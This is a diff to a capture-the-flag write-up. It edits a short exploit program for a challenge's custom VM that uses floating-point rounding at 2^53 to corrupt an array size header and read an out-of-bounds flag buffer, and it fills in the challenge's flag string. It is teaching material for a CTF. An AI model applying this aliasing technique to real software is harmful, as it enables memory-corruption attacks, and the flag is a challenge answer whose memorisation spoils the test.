@@ -494,28 +494,23 @@ size1 = 0 - (2^53 + 4) = -2^53 - 4
 
 so the following VM program will spit out the flag:
 ```nginx
-# 1) Make array 0 huge (exactly 2^53) so +1 rounds away.
 NEW 9007199254740992
 
-# 2) Make array 1. Its base B ≈ 2^53. elem0 aliases its size header.
 NEW 1
 
-# 3) Prepare numbers in array 0.
 INIT 0.0 0
-INIT 0.1 9007199254740996     # = 2^53 + 4 (representable)
+INIT 0.1 9007199254740996
 
-# 4) Overwrite array 1’s size header via the aliasing bug:
-#    size1 = 0 - (2^53 + 4) = -9007199254740996
+# aliasing bug:
+# size1 = 0 - (2^53 + 4) = -9007199254740996
 SUB 0.0 0.1 1.0
 
-# 5) Create array 2. Base becomes negative:
-#    B2 = (2^53) + (-2^53 - 4) + 1 = -3
+# B2 = (2^53) + (-2^53 - 4) + 1 = -3
 NEW 2
 
-# 6) Index 1 of array 2 hits backing[-1] -> the flag buffer.
 PRINT 2.1
 ```
 
 the bounds check (```if (!(idx < arrSize)) throw ...```) implemented doesn't help here because this only violates logic, not the physical address. the VM never verifies that size is non‑negative or a safe integer.   
 
-flag: `<i didnt note down what the flag was :p will update once someone posts a writeup in chat>`
+flag: `brunner{I_was_certain_using_arrays_was_a_good_idea}`
